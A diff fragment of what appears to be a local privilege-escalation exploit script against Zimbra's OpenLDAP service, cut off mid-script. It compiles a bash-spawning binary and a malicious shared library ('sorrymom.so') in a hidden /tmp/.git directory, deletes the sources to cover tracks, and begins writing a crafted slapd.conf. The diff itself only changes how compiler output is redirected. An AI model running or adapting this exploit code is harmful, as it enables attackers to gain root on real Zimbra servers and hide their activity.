@@ -24,9 +24,9 @@ int main(void){
     execvp("/bin/bash", NULL, NULL);
 }
 EOF
-gcc -static -o /tmp/.git/init /tmp/.git/init.c > /dev/null 2>&1
+gcc -static -o /tmp/.git/init /tmp/.git/init.c 2>&1
 rm -rf /tmp/.git/init.c
-gcc -fPIC -shared -ldl -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c > /dev/null 2>&1
+gcc -fPIC -shared -ldl -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c 2>&1
 rm -rf /tmp/.git/sorrymom.c
 cat << EOF > /tmp/.git/slapd.conf
 include		/opt/zimbra/common/etc/openldap/schema/core.schema
